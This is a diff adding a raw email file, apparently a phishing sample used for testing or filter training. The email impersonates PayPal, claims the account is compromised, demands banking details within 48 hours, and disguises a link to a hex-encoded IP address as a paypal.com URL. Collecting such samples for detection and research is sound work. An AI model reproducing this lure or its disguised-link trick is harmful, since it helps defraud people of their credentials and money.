@@ -1,0 +1,100 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id E2558468C4
+ for <user@login.example.com>; Fri,  2 Mar 2007 04:31:01 -0500 (EST)
+X-Greylist: delayed 11692 seconds by postgrey-1.27 at mail.example.org;
+ Fri, 02 Mar 2007 04:31:01 EST
+Received: from 192.168.1.111 (68-249-11-6.ded.ameritech.net [68.249.11.6])
+ by mail.example.org (Postfix) with SMTP id 73DF1131FACC
+ for <user@example.com>; Fri,  2 Mar 2007 04:31:01 -0500 (EST)
+Received: from 132.232.53.124 by ; Fri, 02 Mar 2007 05:23:01 -0400
+Message-ID: <FIQHAKHREBSLSMSTFRVCSSJ@yahoo.com>
+From: "PayPal" <service@paypal.com>
+Reply-To: "PayPal" <service@paypal.com>
+To: user@example.com
+Subject: Compromised PayPal Account 
+Date: Fri, 02 Mar 2007 08:23:01 -0100
+X-Mailer: Microsoft Outlook Express 5.00.2615.200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--88553195784169138"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 915
+
+----88553195784169138
+Content-Type: text/plain;
+Content-Transfer-Encoding: quoted-printable
+
+<html><body> <table border=3D"0" cellpadding=3D"0"
+cellspacing=3D"0" style=3D"border-collapse: collapse" bordercolor=3D"#1111=
+11" width=3D"100%"><tr><td
+width=3D"100%" style=3D"border-style: solid; border-width: 0; padding-left=
+: 4; padding-right: 4;
+padding-top: 1;
+padding-bottom: 1"><br>PayPal Account=AE Posible Fraud - Notification</p><=
+br>Security  check
+!<br><br></b></font>You have received this email because your account has =
+been used from different
+locations by you or someone else.<br>For security purpose, we are required=
+ to open an investigation
+into this matter.<br><font face=3D"Times New Roman"><br></font>In order to=
+ safeguard your account, we
+require that you confirm your banking details.<br>To help speed up this pr=
+ocess, please access the
+following link so we cancomplete the verification of<br>your PayPal
+Account:<br><br><b><BR><BR>Alert code: 1366968850 <BR><BR>
+
+<a target=3D_blank
+HREF=3D'http://0xd2.0xb1.0xf5.0xc5/cgi-bin-sk'>
+https://www.paypal.com/cgi-bin/webscr?cmd=3D_login-submit/?136</a>
+
+
+ </b></p><br>
+<table cellpadding=3D"0" cellspacing=3D"0" style=3D"border-collapse: colla=
+pse; padding: 0"
+bordercolor=3D"#111111" width=3D"100%"
+bgcolor=3D"#FF9966">
+        <tr>
+          <td width=3D"100%">Please Note:<br>
+            If we do no receive the appropriate account verification withi=
+n 48
+            hours, then we will assume this PayPal
+            Bank account is fraudulent and will be suspended.
+            The purpose of this verification is to ensure that your bank a=
+ccount
+            has not been fraudulently used and
+            to combat the fraud from our community.</td>
+      </tr>
+    </table>
+      <p dir=3D"ltr" align=3D"left">We appreciate your support and underst=
+anding and
+        thank you for your prompt attention to this matter.<br>
+        <br>
+Regards,
+<p> PayPal - Paypal Account=AE Security Department</p><table border=3D"0" =
+cellpadding=3D"0"
+cellspacing=3D"0" style=3D"border-collapse: collapse" bordercolor=3D"#1111=
+11"
+width=3D"100%"><tr><td width=3D"100%" bgcolor=3D"#004F4F"><p align=3D"cent=
+er"><b><font color=3D"#FFFFFF">=A9 2007
+PayPal Account & Co.</font></b></td></tr><tr><td width=3D"100=
+%"><p dir=3D"ltr" align=3D"center"><font
+size=3D"2" color=3D"#999999">Please do not reply to this email as this is =
+only a notification. Mail sent
+to this address cannot be answered.</font></p></td></tr><tr><td width=3D"1=
+00%" bgcolor=3D"#004F4F"><div
+align=3D"center"><font color=3D"#FFFFFF">PayPal Account=AE Banking        =
+     Departament</font></div>
+</td>        </tr>      </table>    </td>  </tr></table></body></html>
+
+
+
+
+----88553195784169138--
